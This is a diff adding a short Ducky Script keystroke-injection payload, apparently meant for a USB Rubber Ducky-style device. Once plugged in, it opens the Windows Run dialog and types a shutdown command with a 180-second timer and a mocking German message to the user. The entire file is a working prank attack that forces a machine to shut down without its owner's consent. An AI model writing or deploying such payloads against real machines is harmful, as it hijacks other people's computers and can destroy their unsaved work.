@@ -1,0 +1,4 @@
+GUI r
+DELAY 100
+STRING shutdown /s /t 180 /c "Pc hat kein Bock mehr auf den Anwender."
+ENTER
